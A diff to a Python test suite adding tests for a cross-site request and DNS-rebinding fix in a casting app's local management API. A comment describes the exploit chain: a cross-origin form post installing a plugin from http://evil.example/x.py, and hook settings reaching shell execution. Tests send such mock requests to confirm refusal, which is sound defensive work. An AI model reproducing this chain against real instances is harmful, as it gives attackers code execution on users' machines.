@@ -10257,6 +10257,10 @@ try:
                 return types.SimpleNamespace()
 
         handler28 = _MsHandler28()
+        # `set-module-setting` now sits behind the code-execution gate (Part 48):
+        # the two writes below are the legitimate caller, so they need the token
+        # the settings page sends.
+        _token28 = protocol.api_token()
         from cherrypy import serving as _serving28
         request28 = _serving28.request
         _saved28 = (request28.params, getattr(request28, "remote", None),
@@ -10276,6 +10280,13 @@ try:
             def _post28(**kw):
                 return json.loads(handler28.POST(**kw).decode())
 
+            def _carry28():
+                # The gate asks `cherrypy.request.params` for the token, because
+                # that is where CherryPy puts both the query string and the form
+                # body. So the caller's token goes on the request, not into
+                # POST()'s kwargs -- otherwise the gate never sees it.
+                request28.params = {"token": _token28}
+
             _reset28(ip="192.168.1.9")
             check("module-settings is a management query: loopback or token",
                   _get28(query="module-settings").get("code") == 403
@@ -10289,7 +10300,13 @@ try:
                   str(_res)[:140])
             _res = _post28(**{"set-module-setting": "1",
                               "key": "PlayerOntop", "value": "0"})
-            check("set-module-setting persists through the API",
+            check("set-module-setting is code-execution gated even from loopback",
+                  _res.get("code") == 403 and "token" in _res.get("message", "").lower(),
+                  str(_res))
+            _carry28()
+            _res = _post28(**{"set-module-setting": "1",
+                              "key": "PlayerOntop", "value": "0"})
+            check("set-module-setting persists once it carries the token",
                   _res.get("code") == 0
                   and utils.Setting.setting.get("PlayerOntop") == 0, str(_res))
             _res = _post28(**{"set-module-setting": "1",
@@ -16480,6 +16497,384 @@ except Exception as _e47:
     _traceback47 = __import__('traceback')
     _traceback47.print_exc()
     check("Part 47 runs", False, "{}: {}".format(type(_e47).__name__, _e47))
+
+# --------------------------------------------------------------------------
+# Part 48: a page the user visits cannot drive this machine.
+#
+# docs/architecture-review-2026-09.md R1 said "confirmed code path, no live
+# PoC". That is no longer true. Against a real instance on a temp config dir,
+# four unauthenticated requests from a browser running a page of the attacker's
+# choosing installed and imported a `.py` of the attacker's choosing, and its
+# module-level code ran as the logged-in user. The chain was:
+#
+#   POST http://127.0.0.1:<port>/api
+#   Origin: http://evil.example          <- a form the attacker's page submits
+#   install-plugin=1&plugin-url=http://evil.example/x.py&plugin-type=renderer
+#
+# `install-plugin` sat in `_MANAGEMENT_PARAMS`, and `_management_allowed()`
+# trusts loopback -- but *the browser* decides what loopback means. A form post
+# (urlencoded or multipart: both CORS-"simple") leaves without a preflight and
+# without asking the user anything. `_plugin_change('install')` downloads the
+# file and imports it on the spot. Two other fields reach the same place from
+# the other direction: `save-launch-param` replaces the whole persisted settings
+# dict and restarts the app behind whatever it now says, and
+# `set-module-setting` writes a plugin's own keys -- and 自动化钩子's keys
+# (`Hook_On_Cast` & co.) are handed to `subprocess(shell=True)` the next time
+# anything is cast, which the same request can also do.
+#
+# Two layers close it, and this Part tests both plus the third thing that makes
+# them shippable:
+#   A. every POST answers "could this have come from our own page?" -- the one
+#      thing a drive-by gives away is the `Origin` it carries. Callers that are
+#      not browsers (curl, a phone Shortcut, Home Assistant) send no `Origin`
+#      and are judged by address and token exactly as before (AGENTS.md 4.7).
+#   B. the fields that end up running a file we were handed additionally require
+#      the management token *even from this machine*, because DNS rebinding makes
+#      A and the loopback rule both true of the attacker's own page. The token is
+#      the one thing such a page cannot have: Macast sends no CORS header at all,
+#      so a cross-origin reader cannot see a reply -- asserted below, since the
+#      whole argument rests on it.
+#   C. setting.html must actually send that token on those four flows, or the fix
+#      would just break the page. There is no browser in this suite, so that half
+#      is a text contract (AGENTS.md 4.13's method).
+# --------------------------------------------------------------------------
+print("\n=== Part 48: cross-site posts cannot drive the management API ===")
+try:
+    import io as _io48
+    import re as _re48
+
+    _saved48 = (utils.Setting.setting, utils.Setting.setting_path,
+                utils.SETTING_DIR, protocol.SETTING_DIR)
+    _tmp48 = _tempfile.mkdtemp(prefix="macast-csrf48-")
+    try:
+        utils.SETTING_DIR = _tmp48
+        # `protocol.py` imported that name, so an installer there still reads its
+        # own binding. Without this line a gate that fails open writes the test's
+        # `evil.py` into the user's real config directory -- which mutant 2 of
+        # this Part did, and no check would have noticed.
+        protocol.SETTING_DIR = _tmp48
+        utils.Setting.setting = {}
+        utils.Setting.setting_path = os.path.join(_tmp48, "macast_setting.json")
+        _token48 = protocol.api_token()
+
+        # -- ① the one normaliser, both spellings ----------------------------
+        check("Origin, Referer and Host spellings of one site agree",
+              protocol.site_of('http://127.0.0.1:58880')
+              == protocol.site_of('http://127.0.0.1:58880/api')
+              == protocol.site_of('127.0.0.1:58880'),
+              "{} / {}".format(protocol.site_of('http://127.0.0.1:58880'),
+                               protocol.site_of('127.0.0.1:58880')))
+        check("a default port is not part of a site's name, a real one is",
+              protocol.site_of('http://tv.local') == ('tv.local', None)
+              and protocol.site_of('https://tv.local:443') == ('tv.local', None)
+              and protocol.site_of('http://tv.local:58880') == ('tv.local', 58880),
+              str(protocol.site_of('http://tv.local:58880')))
+        check("case and a trailing dot are folded, IPv6 brackets are not",
+              protocol.site_of('HTTP://Evil.Example./') == ('evil.example', None)
+              and protocol.site_of('http://[::1]:58880/x') == ('::1', 58880),
+              str(protocol.site_of('http://[::1]:58880/x')))
+        check("unusable values answer (None, None) instead of raising",
+              all(protocol.site_of(bad) == (None, None)
+                  for bad in ('', None, 'http:///x', 'file:///tmp/x', '::::')),
+              str([protocol.site_of(b) for b in ('', None, 'http:///x')]))
+
+        # -- ② which names our own page may be opened on ---------------------
+        _names48 = protocol._page_host_names()
+        check("the loopback spellings are always in the list",
+              {'127.0.0.1', 'localhost', '::1'} <= _names48, str(sorted(_names48)))
+        check("so is every address this machine advertises",
+              set(protocol.advertisable_addresses()) <= _names48,
+              "{} vs {}".format(protocol.advertisable_addresses(), sorted(_names48)))
+        check("and a name that resolves here anyway is NOT, because rebinding "
+              "is exactly that",
+              'evil.example' not in _names48, str(sorted(_names48)))
+
+        # -- ③ the gate, on the real request object (Part 12's trick) --------
+        class _Tgt48(object):
+            def __init__(self):
+                self.calls = []
+
+            def cast_uri(self, uri, title=''):
+                self.calls.append((uri, title))
+
+        class _Plugin48(object):
+            title = 'Evil Plugin'
+
+        class _Mgr48(object):
+            def __init__(self):
+                self.installs = []
+
+            def install_url(self, url, plugin_type='renderer'):
+                self.installs.append(('url', url, plugin_type))
+                return _Plugin48()
+
+            def install_file(self, path, plugin_type='renderer', filename=None):
+                self.installs.append(('file', path, filename))
+                return _Plugin48()
+
+        _tgt48, _mgr48 = _Tgt48(), _Mgr48()
+
+        class _H48(protocol.Handler):
+            # Skips the real __init__ (it loads the page off disk and creates
+            # local_files/); none of that is what is under test.
+            def __init__(self):
+                self.local_dir = _tmp48
+
+            @property
+            def protocol(self):
+                return _tgt48
+
+        def _get_mgr48():
+            return _mgr48
+        cherrypy.engine.subscribe('get_plugin_manager', _get_mgr48)
+
+        handler48 = _H48()
+        from cherrypy import serving as _serving48
+        req48 = _serving48.request
+        _sp48 = (req48.params, getattr(req48, 'remote', None),
+                 req48.scheme, dict(req48.headers))
+        _saved_running48 = utils.Setting.is_service_running
+        utils.Setting.is_service_running = staticmethod(lambda: True)
+        try:
+            def _as(ip='127.0.0.1', origin=None, referer=None, token=None,
+                    scheme='http'):
+                """Become the request the next call will read."""
+                req48.headers.clear()
+                for _k, _v in _sp48[3].items():
+                    req48.headers[_k] = _v
+                if origin is not None:
+                    req48.headers['Origin'] = origin
+                if referer is not None:
+                    req48.headers['Referer'] = referer
+                req48.params = {'token': token} if token else {}
+                req48.remote = types.SimpleNamespace(ip=ip)
+                req48.scheme = scheme
+
+            def _post48(**kw):
+                return json.loads(handler48.POST(**kw).decode())
+
+            _port48 = utils.Setting.get_port()
+
+            # A. not a browser: nothing to ask.
+            _as()
+            handler48._same_site()
+            check("a caller with no Origin and no Referer is not stopped here "
+                  "(curl, a Shortcut, Home Assistant)",
+                  True)
+            _res = _post48(**{'cast-uri': 'http://x/a.mp4', 'cast-title': 'a'})
+            check("and it is still served by the address-and-token rules as before",
+                  _res.get('code') == 0 and _tgt48.calls == [('http://x/a.mp4', 'a')],
+                  "{} / {}".format(_res, _tgt48.calls))
+
+            # A. our own page, on each of the names it can be opened on.
+            for _name48 in ('127.0.0.1', 'localhost', protocol.advertisable_addresses()[0]):
+                _as(origin='http://{}:{}/'.format(_name48, _port48))
+                try:
+                    handler48._same_site()
+                    _ok48 = True
+                except protocol.SameSiteError:
+                    _ok48 = False
+                check("our own page on {} is same-site".format(_name48), _ok48)
+            _as(origin='http://127.0.0.1:19999')
+            try:
+                handler48._same_site()
+                _portless48 = True
+            except protocol.SameSiteError:
+                _portless48 = False
+            check("the port is not part of the judgement, so a page we served on "
+                  "another port (58880 was taken) still counts", _portless48)
+
+            # A. the drive-by.
+            _tgt48.calls = []
+            _as(origin='http://evil.example')
+            _res = _post48(**{'cast-uri': 'http://x/b.mp4'})
+            check("a form the user's browser submits from another site is refused, "
+                  "from loopback included",
+                  _res.get('code') == 403 and _tgt48.calls == [],
+                  "{} / {}".format(_res, _tgt48.calls))
+            check("and the refusal says what to do instead of reading like a bad token",
+                  '127.0.0.1:{}'.format(_port48) in _res.get('message', '')
+                  and 'evil.example' in _res.get('message', ''),
+                  _res.get('message'))
+            _as(referer='http://evil.example/page')
+            _res = _post48(**{'cast-uri': 'http://x/c.mp4'})
+            check("Referer answers when Origin is missing (Safari's form posts)",
+                  _res.get('code') == 403 and _tgt48.calls == [],
+                  "{} / {}".format(_res, _tgt48.calls))
+            _as(origin='http://127.0.0.1:{}'.format(_port48),
+                 referer='http://evil.example/page')
+            _res = _post48(**{'cast-uri': 'http://x/d.mp4'})
+            check("Origin wins over Referer -- a page can pick its own Referer",
+                  _res.get('code') == 0, "{} / {}".format(_res, _tgt48.calls))
+            _as(origin='not-a-url')
+            _res = _post48(**{'cast-uri': 'http://x/e.mp4'})
+            check("an Origin we cannot read is refused rather than waved through",
+                  _res.get('code') == 403, str(_res))
+            _tgt48.calls = []
+
+            # B. the code-execution subset: the token, always.
+            check("the gate's list is a subset of the management list, so no field "
+                  "can be code-only and unmanaged",
+                  set(protocol.Handler._CODE_EXECUTION_PARAMS)
+                  <= set(protocol.Handler._MANAGEMENT_PARAMS),
+                  str(set(protocol.Handler._CODE_EXECUTION_PARAMS)
+                      - set(protocol.Handler._MANAGEMENT_PARAMS)))
+            check("and the three measured paths are all in it",
+                  {'install-plugin', 'save-launch-param',
+                   'set-module-setting'} == set(protocol.Handler._CODE_EXECUTION_PARAMS),
+                  str(protocol.Handler._CODE_EXECUTION_PARAMS))
+
+            _as()   # loopback, no Origin: the shape that used to be trusted
+            _res = _post48(**{'install-plugin': '1',
+                              'plugin-url': 'http://evil.example/x.py',
+                              'plugin-type': 'renderer'})
+            check("installing a plugin from this machine without the token is refused",
+                  _res.get('code') == 403 and _mgr48.installs == [],
+                  "{} / {}".format(_res, _mgr48.installs))
+            _res = _post48(**{'save-launch-param': '{"ApplicationPort": 1}',
+                              'token': ''})
+            check("and so is replacing the launch settings",
+                  _res.get('code') == 403
+                  and utils.Setting.setting.get('ApplicationPort') != 1,
+                  "{} / {}".format(_res, utils.Setting.setting))
+            _res = _post48(**{'set-module-setting': '1', 'key': 'PlayerSize',
+                              'value': '1'})
+            check("and so is writing a plugin's key (自动化钩子 lives here)",
+                  _res.get('code') == 403, str(_res))
+            _up48 = types.SimpleNamespace(file=_io48.BytesIO(b'print(1)'),
+                                          filename='evil.py')
+            _res = json.loads(handler48.POST(**{'plugin-file': _up48,
+                                                'plugin-type': 'renderer'}).decode())
+            check("an uploaded .py needs the token too, even though loopback is "
+                  "what it came from",
+                  _res.get('code') == 403 and _mgr48.installs == [], str(_res))
+
+            _as(token=_token48)
+            _res = _post48(**{'install-plugin': '1',
+                              'plugin-url': 'http://ok.example/x.py',
+                              'plugin-type': 'renderer'})
+            check("with the token the same field is served -- the page's own "
+                  "install button still works",
+                  _res.get('code') == 0
+                  and _mgr48.installs == [('url', 'http://ok.example/x.py', 'renderer')],
+                  "{} / {}".format(_res, _mgr48.installs))
+            _as(origin='http://evil.example', token=_token48)
+            _res = _post48(**{'install-plugin': '1',
+                              'plugin-url': 'http://evil.example/x.py'})
+            check("but a token does not make a cross-site browser request same-site",
+                  _res.get('code') == 403
+                  and _mgr48.installs == [('url', 'http://ok.example/x.py', 'renderer')],
+                  "{} / {}".format(_res, _mgr48.installs))
+
+            # B's premise: a cross-origin page cannot read the token out of a reply.
+            # The shape that matters is a header being *sent*; the phrase also
+            # appears in prose (protocol.py explains why the token is unreadable),
+            # and matching on the bare string would flag the explanation of the
+            # defence as the vulnerability.
+            def _sends_cors(src):
+                for _ln48 in src.splitlines():
+                    if 'Access-Control' not in _ln48:
+                        continue
+                    if ('headers' in _ln48 or 'set_response_header' in _ln48
+                            or _re48.search(r'''['"]Access-Control[^'"]*['"]\s*:''',
+                                            _ln48)):
+                        return _ln48.strip()
+                return None
+
+            _no_cors48 = []
+            for _root48 in ('macast', 'macast_renderer'):
+                for _dir48, _sub48, _files48 in os.walk(os.path.join(REPO, _root48)):
+                    for _f48 in _files48:
+                        if not _f48.endswith('.py'):
+                            continue
+                        _src48 = open(os.path.join(_dir48, _f48),
+                                      encoding='utf-8').read()
+                        _hit48 = _sends_cors(_src48)
+                        if _hit48:
+                            _no_cors48.append('{}: {}'.format(
+                                os.path.relpath(os.path.join(_dir48, _f48), REPO),
+                                _hit48))
+            check("nothing in the app sends a CORS header -- that is why the token "
+                  "is unreadable cross-origin",
+                  _no_cors48 == [], str(_no_cors48))
+            check("and the scan fires on every shape that would actually leak",
+                  all(_sends_cors(_s48) for _s48 in (
+                      "cherrypy.response.headers['Access-Control-Allow-Origin'] = '*'",
+                      'cherrypy.response.headers.update('
+                      '{"Access-Control-Allow-Credentials": True})',
+                      "response.headers.setdefault('Access-Control-Allow-Headers', "
+                      "'X-Macast-Token')"))
+                  and not _sends_cors("Macast never sends "
+                                      "`Access-Control-Allow-Origin`."),
+                  'the premise check would pass on a codebase that leaks')
+
+            # C. the page must send the token on exactly those flows.
+            _page48 = open(os.path.join(REPO, 'macast', 'xml', 'setting.html'),
+                           encoding='utf-8').read()
+
+            def _js_method48(name):
+                """The text of one top-level `methods:` entry, by name."""
+                _pat48 = '\n {12,}(?:async )?' + _re48.escape(name) + r'\('
+                _m48 = _re48.search(_pat48, _page48)
+                if _m48 is None:
+                    return None
+                _depth, _i = 0, _page48.index('{', _m48.end() - 1)
+                while _i < len(_page48):
+                    if _page48[_i] == '{':
+                        _depth += 1
+                    elif _page48[_i] == '}':
+                        _depth -= 1
+                        if _depth == 0:
+                            return _page48[_m48.start():_i + 1]
+                    _i += 1
+                return None
+
+            for _fn48, _field48 in (('install', 'install-plugin'),
+                                    ('install_from_url', 'install-plugin'),
+                                    ('save', 'save-launch-param'),
+                                    ('save_module_setting', 'set-module-setting'),
+                                    ('remove_module_setting', 'set-module-setting')):
+                _body48 = _js_method48(_fn48) or ''
+                check("{} posts {} through a token-carrying path".format(
+                    _fn48, _field48),
+                    bool(_body48) and _field48 in _body48
+                    and ('management_token' in _body48
+                         or 'post_module_setting' in _body48),
+                    "method not found" if not _body48 else _body48[:90])
+            _body48 = _js_method48('post_module_setting') or ''
+            check("which is to say: post_module_setting itself is the guarded path",
+                  'management_token' in _body48, _body48[:90])
+            _body48 = _js_method48('on_plugin_before') or ''
+            check("the upload asks for the token before el-upload posts the file",
+                  'management_token' in _body48, _body48[:120])
+            _up_tag48 = _re48.search(r'<el-upload[^>]*name="plugin-file"[^>]*>',
+                                     _page48)
+            check("and the upload's own form data carries it",
+                  _up_tag48 is not None and 'token: cast_info.token' in _up_tag48.group(0),
+                  _up_tag48.group(0)[:160] if _up_tag48 else 'no el-upload found')
+            check("one token method serves every flow (the mirror tab included)",
+                  _page48.count('async management_token()') == 1
+                  and 'await this.management_token()' in (_js_method48('mirror_token') or ''),
+                  str(_page48.count('async management_token()')))
+        finally:
+            req48.params, req48.remote, req48.scheme, _ = _sp48
+            req48.headers.clear()
+            for _k, _v in _sp48[3].items():
+                req48.headers[_k] = _v
+            utils.Setting.is_service_running = _saved_running48
+            try:
+                cherrypy.engine.unsubscribe('get_plugin_manager', _get_mgr48)
+            except Exception:
+                pass
+    finally:
+        utils.SETTING_DIR = _saved48[2]
+        protocol.SETTING_DIR = _saved48[3]
+        utils.Setting.setting, utils.Setting.setting_path = _saved48[0], _saved48[1]
+        _shutil.rmtree(_tmp48, ignore_errors=True)
+except Exception as _e48:
+    _traceback48 = __import__('traceback')
+    _traceback48.print_exc()
+    check("Part 48 runs", False, "{}: {}".format(type(_e48).__name__, _e48))
 
 # --------------------------------------------------------------------------
 
